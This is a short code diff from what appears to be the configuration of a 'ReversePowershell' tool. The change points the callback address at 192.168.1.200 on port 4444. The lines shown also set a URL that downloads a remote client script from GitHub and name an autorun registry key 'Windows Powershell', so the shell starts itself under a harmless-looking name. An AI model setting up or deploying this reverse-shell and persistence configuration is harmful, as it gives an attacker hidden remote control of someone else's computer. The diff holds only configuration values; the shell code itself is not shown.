@@ -1,7 +1,7 @@
 # Replace address and port with your server's
 # You can edit the script URL if you are hosting it somewhere else
 
-$address = 'localhost'
+$address = '192.168.1.200'
 $port = 4444
 $scriptURL = 'https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1'
 $autorunKeyName = "Windows Powershell"
